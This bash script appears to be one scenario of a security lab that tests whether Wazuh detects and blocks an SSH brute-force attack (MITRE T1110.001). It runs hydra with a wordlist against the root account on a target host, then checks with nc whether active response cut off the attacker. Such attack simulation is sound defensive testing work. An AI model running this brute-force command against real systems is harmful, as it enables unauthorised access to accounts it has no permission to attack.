#!/bin/bash
# Scenario 3 - SSH brute force           MITRE ATT&CK: T1110.001 Password Guessing
# Expect: Wazuh 5760 (failed password) -> 5763 (brute force), then ACTIVE RESPONSE
#         drops this IP on the victim for 120 seconds. Lab rule 100102 shows the
#         same attack from the network sensor's point of view.
source /attacks/common.sh

banner "03 Brute force: hydra against SSH with a small wordlist"
wait_for_port 22 || { info "port 22 unreachable (still blocked?)"; exit 1; }

timeout 90 hydra -l root -P /attacks/wordlist.txt -t 4 -w 5 -f "ssh://$TARGET" 2>&1 | tail -n 6

info "checking whether the defender cut us off..."
sleep 5
if nc -z -w 3 "$TARGET" 22 2>/dev/null; then
  info "port 22 still reachable - no containment happened"
else
  info "port 22 no longer reachable - active response blocked the attacker"
fi
